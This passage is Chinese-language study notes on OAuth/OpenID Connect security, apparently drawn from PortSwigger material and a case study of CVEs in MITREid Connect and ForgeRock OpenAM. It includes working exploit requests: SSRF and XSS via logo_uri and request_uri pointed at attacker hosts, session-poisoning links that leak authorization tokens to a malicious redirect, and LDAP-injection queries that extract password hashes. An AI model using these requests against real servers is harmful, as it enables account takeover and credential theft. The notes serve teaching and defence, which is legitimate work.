- 最好也看看 OAuth provider 的 doc，看看是否有關於其 OpenID Connect 支持的有用資訊
- 你也可以通過標準 endpoind `/.well-known/openid-configuration` 看看 config file



---------


## OpenID Connect 漏洞
OpenID Connect 的 spec 比基本 OAuth 嚴格得多
- 一般來說，存在明顯漏洞的可能性較小
- 儘管如此，OpenID Connect 只是 OAuth 上的一個 layer，client application 或 OAuth service 仍有可能受到前面提到的一些基於 OAuth 的攻擊



下面探討 OpenID Connect 的一些額外功能可能帶來的其他漏洞


**未受保護的動態 client 註冊功能:**  
OpenID spec 允許 client application 向 OpenID provider 註冊的標準化方式
- 如果支持 dynamic client registration，client application 就可以通過向專用的 `/registration` endpoint 發 `POST` request 來進行註冊
  - 該 endpoint 的名稱通常在 config file 和 doc 中提供



在 request body 中，client application 會以 JSON 送出有關自身的關鍵資訊
- 例如，通常包含一組白名單 redirect URIs
- client application 還可以提供一系列附加資訊，如希望公開的 endpoint 名稱、app name 等

一個典型的註冊請求可能是這樣的
```
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
  "application_type": "web",
  "redirect_uris": [
    "https://client-app.com/callback",
    "https://client-app.com/callback2"
    ],
  "client_name": "My Application",
  "logo_uri": "https://client-app.com/logo.png",
  "token_endpoint_auth_method": "client_secret_basic",
  "jwks_uri": "https://client-app.com/my_public_keys.jwks",
  "userinfo_encrypted_response_alg": "RSA1_5",
  "userinfo_encrypted_response_enc": "A128CBC-HS256",
  …
}
```

OpenID provider 應要求 client application 進行身份驗證
- 上面的範例使用的是 HTTP `bearer token`
- 不過，有些 provider 會允許動態註冊，而不進行任何身份驗證，這使得攻擊者可以註冊自己的惡意 client application
  - 這可能會產生各種後果，具體取決於如何使用這些攻擊者可控屬性的值


例如
- 你可能已經注意到，其中一些屬性可以作為 `URI` 提供
- 如果 OpenID provider 訪問了其中任何一個屬性，除非採取額外的安全措施，否則就有可能導致二階 SSRF 漏洞




練習題: SSRF via OpenID dynamic client registration
- https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration


**允許通過 `reference` 進行 authorization requests:**  
到此為止，我們已經了解了提交 authorization requests 所需參數的標準方式，即通過 queryString
- 有些 OpenID provider 會讓你選擇以 JWT 的形式傳遞這些參數
- 如果支持此功能，則可以發送一個指向 JWT 的 `request_uri` 參數，該 token 包含 OAuth 的其餘參數及其值
- 根據 OAuth service 的配置，該 `request_uri` 參數是 SSRF 的另一個潛在載體


你也可以使用此功能繞過對這些參數值的驗證
- 有些 server 可以有效地驗證授權請求中的 queryStting，但可能無法對 JWT 中的參數(包括 `redirect_uri`)進行同樣的驗證




要檢查是否支持該選項
- 應在 config file 和 doc 中找 `request_uri_parameter_supported` 選項
- 或者，你也可以嘗試加入 `request_uri` 參數，看看是否有效
  - 你會發現有些 server 即使沒有在 doc 中提及，也會支持這一功能




---------


## 如何防止 OAuth authentication 漏洞
要防止 OAuth authentication 漏洞
- OAuth provider 和 client application 都必須對關鍵 input (尤其是 `redirect_uri` 參數)做好確實的驗證
- OAuth 規範中的內建保護非常少，因此開發人員自己要盡可能確保 OAuth 流程的安全


client application 和 OAuth service 本身都可能出現漏洞
- 即使你自己的實作防禦非常強，最終還是要依賴另一端的 application 是否同樣強大


---------



## 對於 OAuth serviceproviders
- 要求 client application 註冊有效的 `redirect_uris` 白名單
  - 在可能的情況下，使用嚴格的 byte 對 byte 比較來驗證任何傳入 request 中的 URI
  - 只允許完全和精確匹配，而不使用 pattern match。這樣可以防止攻擊者訪問白名單域上的其他頁面
- 強制使用 `state` 參數。該參數的值還應與 user 的 session 綁定
  - 包括一些不可猜測的 session 特定資料，如包含 session cookie 的 hash
  - 這有助於保護 CSRF 的攻擊。也會使攻擊者更難使用竊取的 `authorization codes`
- 在 resource server 上，確保已向發出 request 的同一個 `client_id` 簽發了 `access token`
  - 還應檢查 request 的 scope，確保與最初授權 token 的範圍一致


---------


## 針對 application client side 的 OAuth
- 確保實作 OAuth 前完全了解其工作原理的細節
  - 許多漏洞都是由於不了解每個階段到底發生了什麼以及如何利用這些細節造成的
- 使用 `state` 參數，**即使它不是強制性的**
- 不僅要向 `/authorization` endpoint 送 `redirect_uri` 參數，還要向 `/token` endpoint 發送
- 在開發 mobile 或 desktop OAuth client application 時，通常無法將 `client_secret` 保密
  - 在這情況下，可使用 `PKCE` (`RFC 7636`) 提供額外保護，防止 code 被截獲或洩漏
- 如果使用 OpenID Connect `id_token`，確保根據 `JSON Web Signature`, `JSON Web Encryption` 和 OpenID 規範對其進行了正確驗證
- 小心使用 authorization codes，當載入外部圖片、 script 或 CSS 時，它們可能會通過 `Referer` header 洩露
  - 同樣重要的是，不要將它們包含在動態產生的 JavaScript 檔案中，因為它們可能會通過 `<script>` tag  從外部 domain 執行


-----------

追加讀一篇 case studty 文章: Hidden OAuth attack vectors
- 作者 [Michael Stepankin](https://twitter.com/artsploit) 是上面這些文章的協同作者之一  

----------

## 隱藏的 OAuth 攻擊向量

這邊將介紹三個 OAuth2 和 OpenID Connect 漏洞：
1. **動態 client side 註冊: SSRF by design**
2. **`redirect_uri` Session Poisoning**
3. **WebFinger User Enumeration**

下面介紹其中的關鍵概念，並在兩個 open-source OAuth server (ForgeRock OpenAM 和 MITREid Connect)上演示這些攻擊，並提供一些關於如何自行檢測這些漏洞的提示


**關於 OpenID:**    
在深入探討漏洞之前，簡單談談 OpenID
- `OpenID Connect` 是對 OAuth 的一種擴展，它帶來了許多新功能
  - 包括 `id_tokens`, `automatic discovery`, `configuration endpoint` 等
- 從 pentesting 的角度來看，每當測試 OAuth 時，目標很有可能也支持 OpenID，這大大擴展了攻擊面
- **作為 hunter，每當測試 OAuth 流程時，都應嘗試獲取標準的 `/.well-known/openid-configuration` endpoint**
  - 即使在黑盒評估中，這也能為你提供大量信息。

-------------------


## 第一章: Dynamic Client Registration - SSRF by design
過去許多 OAuth 攻擊都以 authorization endpoint 為目標
- 因為每次登錄時你都會在 browser traffic  中看到它
- 如果測試網站時看到類似 `/authorize?client_id=aaa&redirect_uri=bbb` 的 request，可以比較肯定地認為這是個 OAuth endpoint
  - 其中有大量你可以測試的參數
- 與此同時，由於 OAuth 是複雜的協議，server 可能還支持其他 endpoint，即使 client HTML page 從未引用過這些 endpoint


其中一個可能被忽略的隱藏 URL 就是 **Dynamic Client Registration endpoint**
- 為了成功驗證用戶身份，OAuth server 需要了解 client application 的詳細信息
  - 如 `client_name`, `client_secret`, `redirect_uris` 等
- 這些詳細信息可以通過 local configuration 提供
- 但 OAuth authorization servers 也可能有個特殊的 registration endpoint

該 endpoint 通常為 `/register`，並接受以下格式的 POST request:

```
POST /connect/register HTTP/1.1
Content-Type: application/json
Host: server.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJ ...

{
  "application_type": "web",
  "redirect_uris": ["https://client.example.org/callback"],
  "client_name": "My Example",
  "logo_uri": "https://client.example.org/logo.png",
  "subject_type": "pairwise",
  "sector_identifier_uri": "https://example.org/rdrct_uris.json",
  "token_endpoint_auth_method": "client_secret_basic",
  "jwks_uri": "https://client.example.org/public_keys.jwks",
  "contacts": ["ve7jtb@example.org"],
  "request_uris": ["https://client.example.org/rf.txt"]
}
```

有兩個 spec 定義了此請求中的參數
1. 用於 OAuth 的 [RFC7591](https://datatracker.ietf.org/doc/html/rfc7591)
2. [Openid Connect Registration 1.0](https://openid.net/specs/openid-connect-registration-1_0.html#rfc.section.3.1)


正如這裡看到的，其中許多值都是通過 URL references 傳入的
- 看起來像是 [Server Side Request Forgery](https://portswigger.net/web-security/ssrf) 的潛在目標
- 同時，我們測試過的大多數 server 在收到註冊請求時都不會立即解析這些 URL
- 相反，它們只是保存這些參數，稍後在 OAuth authorization flow 中使用
- 換句話說，這更像是一種二階 SSRF，從而增加了黑盒檢測的難度



以下參數對 SSRF(Server Side Request Forgery) 攻擊特別有用:

- `logo_uri`:
  - 用於引用 client application logo URL
  - 註冊 client side 後，可以嘗試使用新的 `client_id` 呼叫 OAuth authorization endpoint (`/authorize`)
  - 登錄後，server 將要求你批准請求，並可能顯示 `logo_uri` 中的圖片
  - 如果 server 自行 fetch 圖片，則 SSRF 應在此步驟中觸發
  - 或者，server 也可以只通過 client `<img />` tag 包含 logo
    - 雖然這無法導致 SSRF，但如果 URL 沒有 escape，可能會導致 XXS
- `jwks_uri`
  - client 的 JSON Web Key Set (JWK) 文件的 URL
  - 在使用 JWT 進行 client authentication (RFC7523) 時，server 需要使用此 key set 來驗證向 token endpoint 發出的簽名請求
  - 為了測試該參數中的 SSRF，使用惡意 `jwks_uri` 註冊新的 client application，執行授權流程以獲取任何 user 的 `authorization code`，然後取得帶有以 body 的 `/token` endpoint


```
POST /oauth/token HTTP/1.1
...

grant_type=authorization_code&code=n0esc3NRze7LTCu7iYzS6a5acc3f0ogp4&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=eyJhbGci...
```


如果存在漏洞，server 會對提供的 `jwks_uri` 執行 server-to-server 的 HTTP request，因為它需要這個 key 來檢查請求中 `client_assertion` 參數的有效性。不過，這可能只是個 [blind SSRF](https://portswigger.net/web-security/ssrf/blind) 漏洞，因為 server 希望得到正確的 JSON response  

- `sector_identifier_uri`
  - 一個存著 `redirect_uri` URI 的 JSON array 檔案 URL
  - 如果支持，server 會在你 submit dynamic registration request 後立即獲取該值
    - (如果沒有立即獲取，請嘗試在 server 上對該 client application 執行授權)
  - 由於需要知道 `redirect_uris` 才能完成授權流程，這將迫使 server 向惡意 `sector_identifier_uri` 發出 request
- `request_uris`
  - 該 client application 允許的 `request_uris` array
  - authorization endpoint 可支持 `request_uri` 參數，以提供包含請求資訊的 JWT 的 URL
  - (注意: 不要將該參數與 `redirect_uri`混淆。`redirect_uri`用於授權後的 redirect，而 `request_uri` 是 server 在授權流程開始時獲取的)
  - **即使未啟用 dynamic client registration**，或需要進行身份驗證，我們也可以嘗試使用 `request_uri` 在 authorization endpoint 上執行 SSRF：

```
GET /authorize?response_type=code%20id_token&client_id=sclient1&request_uri=https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt
```


同時，我們看到許多 server 不允許任意的 `request_uri` 值
- 它們只允許在 client 註冊過程中預先註冊的白名單 URL
- 這就是為什麼需要事先提供 `"request_uris": "https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt"`

以下參數也包含 URL，但通常不用於發出 server-to-server requests。相反，它們用於 client 的 redirection/referencing:
- `redirect_uri`: 授權後用於 redirect client 的 URL
- `client_uri`: client application main page 的 URL
- `policy_uri`: Relying Party client application 提供的 URL
  - 以便 end user 了解如何使用其配置文件資料
- `tos_uri`: Relying Party client 提供的 URL，以便 end point 閱讀 relying Party 的服務條款
- `initiate_login_uri`: 使用 `https` 方案的 URI
  - 第三方可使用該 URI 啟動 RP 的登錄。也可用於 client-side redirection


根據 OAuth 和 OpenID 規範，所有這些參數都是 optional 參數
- 特定 server 並不總是支持這些參數，因此需要確定你的 server 支持哪些參數

如果你的目標是 OpenID server
- 位於 `.well-known/openid-configuration` 的發現 endpoint 有時會包含 `registration_endpoint`, `request_uri_parameter_supported`和 `require_request_uri_registration` 等參數
  - 這些參數可幫助你找到 registration endpoint 和其他 server config value


---------------------

## CVE-2021-26715: 在 MITREid Connect，透過 `logo_uri` 執行 SSRF
[MITREid Connect](https://github.com/mitreid-connect/OpenID-Connect-Java-Spring-Server) 充當獨立的 OAuth authorization server
- 在 default 配置中，它的大部分頁面都需要適當的授權，而且你甚至不能建立新用戶，只有管理員才允許建立新帳號
- 它還實現了 [OpenID Dynamic Client Registration](https://openid.net/specs/openid-connect-registration-1_0.html) 
- 並支持註冊 client OAuth application
  - 雖然該功能僅在 admin panel 中引用，但實際的 `/register` endpoint 根本不會檢查當前 session


查看 source code，我們發現 `MITREid Connect` 使用 `logo_uri` 的方式如下:
- 在註冊過程中，client application 可指定其 `logo_uri` 參數
  - 該參數指向與 application 相關的圖片，`logo_uri` 可以是任意 URL
- 在授權步驟中，當 user 被要求批准新 application 的訪問請求時， authorization server 會發出 server-to-server 的 HTTP request，從 `logo_uri` 參數中下載圖片，緩存後與其他信息一起顯示給 user


當 user 訪問 `/openid-connect-server-webapp/api/clients/{id}/logo` endpoint 時
- 這個過程就會發生，並返回所獲取的 `logo_uri` 內容
- 具體來說，存在漏洞的 controller 位於 `org.mitre.openid.connect.web.ClientAPI#getClientLogo`

由於 server 不會檢查內容是否確實是圖片
- 因此攻擊者可能會濫用該功能來請求從 authorization server 訪問任何 URL 並顯示其內容，從而導致 SSRF 攻擊

由於 `getClientLogo` controller 不強制執行任何 image `Content-Type` header
- 攻擊者可以從自己的 URL 顯示任意 HTML 內容，因此該功能也可能被濫用來執行 XXS
  - 如果 HTML 包含 JavaScript，則會在 authorization server domain 內執行


**Exploit:**  
如上所述，我們需要發送 dynamic client registration request
- 在這情況，我們需要提供的最基本參數是 `redirect_uri` 和 `logo_uri`


```
POST /openid-connect-server-webapp/register HTTP/1.1
Host: local:8080
Content-Length: 118
Content-Type: application/json

{
  "redirect_uris": ["http://artsploit.com/redirect"],
  "logo_uri": "http://artsploit.com/xss.html"
}
```



針對 `"logo_uri": "http://artsploit.com/xss.html"` 發起 server-to-server request
- user 應該會被導到 `/api/clients/{client.id}/logo` 頁面


![](https://portswigger.net/cms/images/c1/73/1768-article-oauth1.png)  


訪問最後一個頁面需要低權限帳號
- 如果攻擊者能夠通過註冊獲得一個帳號，他們就可以使用該 endpoint 向 local server 發出任意 HTTP request 並顯示其結果


此外，這種攻擊還可用於對已通過身份驗證的 user 實施 XSS 攻擊
- 因為它允許在頁面上 inject 任意 JavaScript
- 如上例所示，惡意的 `"logo_uri": "http://artsploit.com/xss.html"` 可用於執行 `alert(document.domain)`



`{client.id}` 參數是與每個在 OAuth server 註冊的新 client 相關聯的遞增值
- 它可以在 client 註冊後取得，無需任何憑證
- 由於建立 server 時已經存在一個默認 client application，因此第一個動態註冊的 client 的 `client_id` 將為 `2`


從這個漏洞中我們可以看到，OAuth servers 的 registration endpoint 可能存在二階 SSRF 漏洞
- 因為 spec 明確規定可以通過 URL 引用提供一些值
- 這些漏洞很難發現，但由於 OAuth 註冊格式是標準化的，因此即使在黑盒方案中也有可能發生


-----------------------



## 第二章: `redirect_uri` session中毒
下個漏洞在於 server 在驗證流程中傳遞參數的方式



根據O Auth spec (section 4.1.1 in [RFC6749](https://datatracker.ietf.org/doc/html/rfc6749#section-4.1.1))
- 每當 OAuth server 收到 authorization request 時，它都應該驗證 request 以確保所有必要參數都存在且有效
- 如果 request 有效，authorization server 將對 resource owner 進行驗證，並獲得授權決定(authorization decision)(通過詢問 resource owner 或通過其他方式獲得批准)


聽起來很簡單，對嗎？在幾乎所有的 OAuth 圖表中，這個過程都顯示為一個步驟，但實際上它涉及三個獨立的操作，需要由 OAuth server 來執行:
1. 驗證所有 request 參數(包括 `client_id`和 `redirect_uri`)
2. 驗證 user 身份(通過 submit login form 或其他方式)
3. 徵求 user 同意與外部共享資料
4. 將 user redirect 回外部(參數中包含 code/token)


在我們見過的許多 OAuth server 實作中，這些是通過使用三個不同的 controllers 來分隔的
- 比如 `/authorize`, `/login`, `/confirm_access`


在第一步 (`/authorize`)，server 會檢查 `redirect_uri` 和 `client_id`
- 之後，在 `/confirm_access` 階段，server 需要使用這些參數來發出 `code`

那麼 server 如何記住它們呢？最明顯的方法是:
1. 在 session 中存儲 `client_id` 和 `redirect_uri`
2. 在每一步的 HTTP queryString 參數中保存它們。這可能需要對每一步進行有效性檢查，而且驗證程序可能不同
3. 建立一個新的 `interaction_id` 參數，用於 uniquely identifies 與 server 啟動的每個 OAuth authorization flow



從這裡可以看出，嚴格的 OAuth spec 並沒有對此給出任何建議。因此，實現這種行為的方法多種多樣  


第一種方法(存在 session 中)非常直觀
- 但當為同一個 user 同時發送多個 authorization requests 時，可能會導致 race condition problems

讓我們仔細看看這個例子。流程以一個普通的 authorization request 開始:

```
/authorize?client_id=client&response_type=code&redirect_uri=http://artsploit.com/
```


server 檢查參數，將其存在 session 中，並顯示同意頁面:
 

![](https://portswigger.net/cms/images/c7/1d/1921-article-oauth2.png)  


點了「授權」後，server 將收到以下 request:  

![](https://portswigger.net/cms/images/66/ca/9762-article-oauth3.png)  


request body 中不包含任何關於 client 授權的參數
- 這意味著 server 是從 user session 中取得這些參數的。我們甚至可以在黑盒測試中發現這種行為


基於這種行為的攻擊大致如下:
1. User 訪問特製頁面(就像典型的 XSS/CSRF 攻擊場景)。
2. 該頁面把 user redirects 到一個有可信 `client_id` 的 OAuth 授權頁面
3. (在後台)頁面使用「不可信」的 `client_id` 向 OAuth 授權頁面發送隱藏的 cross-domain request，從而破壞 session
4. user 批准第一個頁面，由於 session 包含更新值，user 將被 redirect 到不可信 client 的 `redirect_uri`


在許多真實系統中，第三方用戶可以註冊自己的 client application
- 因此該漏洞可能允許他們註冊任意的 `redirect_uri` 並向其洩漏 token


不過也有一些注意事項:
- user 必須批准任何可信的 client
- 如果 user 之前已經批准了同一個 client，server 可能會直接 redirect，而不要求 user 確認
- 方便的是，OpenID spec 提供了 `prompt=consent` 參數，我們可以加到 authorization request 的 URL 中，這樣就有可能解決這個問題
- 如果 server 遵循 OpenID spec，即使 user 之前已經同意，也應該要求 user 確認是否同意
  - 如果不進行確認，利用的難度會增加，但仍然可行，這取決於特定的 OAuth server 的實作方式



-------------------


## CVE-2021-27582：[MITREid Connect] 通過 Spring 自動綁定來繞過 `redirect_uri`
MITREid Connect server 易受上述 session 中毒問題的影響
- 在這情況，利用漏洞甚至不需要註冊額外的 client，因為 application 在確認頁面上存在大量分配漏洞(assignment vulnerability)，這也會導致 session poisoning

During the OAuth2 flow, when a user navigates to the authorization page ("/authorize"), the AuthorizationEndpoint class correctly checks all provided parameters (client_id, redirect_uri, scope, etc…). After that, when the user is authenticated, the server displays a confirmation page, asking the user to approve the access. The user's browser only sees the "/authorize" page but, internally, the server performs an internal request forwarding from "/authorize" to "/oauth/confirm_access". In order to pass parameters from one page to another, the server uses an `"@ModelAttribute("authorizationRequest")"` annotation on the ["/oauth/confirm_access" controller](https://github.com/mitreid-connect/OpenID-Connect-Java-Spring-Server/blob/a2e8cb1a67a5546fdef11c604142a847e7c61261/openid-connect-server/src/main/java/org/mitre/oauth2/web/OAuthConfirmationController.java#L104):

在 OAuth2 流程中，當 user 瀏覽到 authorization page (`/authorize`)時
- `AuthorizationEndpoint` class 會正確檢查所有提供的參數(`client_id`, `redirect_uri`, `scope` 等)
- 之後，當 user 通過驗證後，server 會顯示 confirmation page，要求 user 批准訪問
- User 的 browser 只能看到 `/authorize` 頁面，但在內部，server 會執行從 `/authorize` 到 `/oauth/confirm_access` 的內部 request 轉發
- 為了將參數從一個頁面傳到另個頁面，server 在 ["/oauth/confirm_access" controller](https://github.com/mitreid-connect/OpenID-Connect-Java-Spring-Server/blob/a2e8cb1a67a5546fdef11c604142a847e7c61261/openid-connect-server/src/main/java/org/mitre/oauth2/web/OAuthConfirmationController.java#L104) 上使用了 `@ModelAttribute("authorizationRequest")` annotation


```java
@PreAuthorize("hasRole('ROLE_USER')")
@RequestMapping("/oauth/confirm_acces")
public String confimAccess(Map<String, Object> model, @ModelAttribute("authorizationRequest") AuthorizationRequest authRequest, Principal p) {
```

這個註解(annotation)有點棘手
- 它不僅從上一個 controller Model 中取得參數，還從當前 HTTP request query 中取得參數值
- 因此，如果 user 在 browser 中直接導到 `/oauth/confirm_access`，就能從 URL 中提供所有 AuthorizationRequest 參數，並繞過 `/authorize` 頁面上的檢查


唯一需要注意的是
- `/oauth/confirm_access` controller 要求 `@SessionAttributes("authorizationRequest")` 必須存在於 user sesseion 中
- 然而，只需訪問 `/authorize` 頁面，而不對其執行任何操作，就能輕鬆實現這一點
- 該漏洞的影響類似於從未檢查過 `redirect_uri` 的典型案例

**Exploit:**  
- 攻擊者可以製作兩個指向 authorization 和 confirmation endpoint 的特殊 link
- 每個 link 都有自己的 `redirect_uri` 參數，並將它們提供給 user


```
/authorize?client_id=c931f431-4e3a-4e63-84f7-948898b3cff9&response_type=code&scope=openid&prompt=consent&redirect_uri=http://trusted.example.com/redirect
```

```
/oauth/confirm_access?client_id=c931f431-4e3a-4e63-84f7-948898b3cff9&response_type=code&prompt=consent&scope=openid&redirectUri=http://malicious.example.com/steal_token
```


`client_id` 可以來自 user 已經信任的任何 client application
- 訪問 `/confirm_access` 時，它會從 URL 中取所有參數，並對 model/session 下毒
- 現在，當 user 批准第一個 request 時(因為 `client_id` 是可信的)，authorization token 就會洩露給惡意網站



你可能會注意到
- 第一個請求中的 `redirect_uri` 與第二個的 `redirectUri` 存在區別
- 這是有意為之，因為第一個參數是一個有效的 OAuth 參數，而第二個參數是一個參數名，在大規模賦值時實際綁定到 `AuthorizationRequest.redirectUri` model attribute


這裡的 `@ModelAttribute("authorizationRequest")` annotation 是不必要的
- 而且會在轉發過程中產生額外的風險
- 執行相同操作的更安全方法是從 `Map<String, Object> model` 中取這些值，作為使用 `@RequestMapping("/oauth/confirm_access")` 註解的方法的輸入參數


即使這裡不存在 mass assignment
- 通過同時發送兩個 authorization requests，使它們共享同個 session，這個漏洞仍有可能被利用


-----------------

## Chapter three: "/.well-known/webfinger" makes all user names well-known
The "/.well-known/webfinger" is a standard OpenID endpoint that displays information about users and resources used on the server. For example, it can be used in the following way to validate that the user "anonymous" has an account on the server:




## 第三章 `/.well-known/webfinger` 讓所有人知道所有 user name
`/.well-known/webfinger` 是個標準的 OpenID endpoint
- 用於顯示 server 上的 user 和 resources 資訊
- 例如，可以用它來驗證 user "anonymous" 在 server 上是否有帳號


![](https://portswigger.net/cms/images/96/8b/3527-article-oauth4.png)  


這只是另個 OpenID endpoint
- 在 crawling 過程中可能找不到，因為它是供 OpenID client application 使用的，這些請求不是從 browser 發的
- [spec](https://openid.net/specs/openid-connect-discovery-1_0.html) 指出，`rel` 參數的靜態值應為 `http://openid.net/specs/connect/1.0/issuer` 和 `resource` 應包含以下形式之一的有效 URL:

- `http://host/user`
- `acct://user@host`


該 URL 在 server 上進行解析，並不真正用於發送 HTTP requeset
- 因此這裡沒有 SSRF
- 同時，你可以嘗試在這裡查找普通漏洞(如 SQL injection)，因為 endpoint 不需要任何身份驗證


該 endpoint 的棘手之處在於 response status code
- 如果參數無效或未找到 username，它可能會返回 404，因此在將其加到 content discovery tool 時要小心


--------

## [ForgeRock OpenAm] Webfinger 協議中的 LDAP Injection
我們在 **ForgeRock 的 OpenAM server** 中發現了 Webfinger endpoint 漏洞的一個很好的案例
- 這款商業軟體曾經存在 LDAP Injection 漏洞

在 source code 分析過程中，發現 OpenAM server 在處理 request 時，會將 user 提供的 resource 參數嵌入到對 LDAP server 的過濾查詢中
- LDAP 查詢建立在文件中:


```java
String[] objs = { filter };
String FILTER_PATTERN_ORG = "(&(objectclass="
  + SMSEntry.OC_REALM_SERVICE + ")(" + SMSEntry.ORGANIZATION_RDN
  + "={0}))";
String sfilter = MessageFormat.format(FILTER_PATTERN_ORG, (Object[]) objs);

```



如果 resource 包含特殊字元，如 `( ) ; , * |`
- application 不會對其進行任何轉義處理，並隨後將其包含在 LDAP 查詢過濾器中
- 從攻擊者的角度來看，可以使用 LDAP 過濾器訪問存儲在 LDAP 中的用 user object 的不同字段
  - 其中一種攻擊情況可能是枚舉一個有效的 user name



```
/openam/.well-known/webfinger?resource=http://x/dsa*&rel=http://openid.net/specs/connect/1.0/issuer
```



如果有以 `dsa*` 開頭的 username，server 會 response  HTTP 200(OK)，否則 HTTP 404  

此外，我們還可以根據 user password 指定過濾器:  


```
/openam/.well-known/webfinger?resource=http://x/dsameuser)(sunKeyValue=userPassword=A*)(%2526&rel=http://openid.net/specs/connect/1.0/issuer
```

![](https://portswigger.net/cms/images/37/33/0091-article-oauth5.png)  
![](https://portswigger.net/cms/images/cc/ce/3586-article-oauth6.png)  



這樣我們就能逐個字提取 user password 的 hash 值
- 這種攻擊不僅限於提取 user 屬性，還可用於提取有效的 session token 或用於 token 簽名的私鑰
- 這個漏洞存在於 OpenAm server 的標準 OpenID component 中，不需要任何身份驗證
- (從 13.5.1 開始，商業版產品已經修補了這漏洞(詳見 `OPENAM-10135`))


---------------

## 結論
OAuth 和 OpenID Connect 協議非常複雜
- 如果你在網站上測試 OAuth 授權流程，你看到的可能只是一小部分受支持的參數和可用 endpoint
- 雖然 Facebook, Google 和 Apple 可以自己實現這些協議，但小公司通常使用開源實現方法或商業產品
- 你可以自行下載。深入研究文檔和 RFC，嘗試在 Github 上找 code，檢查 Docker 容器，以確定你能接觸到的所有功能，你會驚訝於自己能發現多少獨特的錯誤

[ActiveScan++ v1.0.22](https://github.com/PortSwigger/active-scan-plus-plus/commit/9432e0a09c3bf728b9e9b5534da9e2064f9c2847) 現在可以檢測 OpenId 和 OAuth configuration endpoints 的存在
- 並幫助你發現它們。我們還將它們列入 Burp Intruder 的 `Interesting files and directories` list 中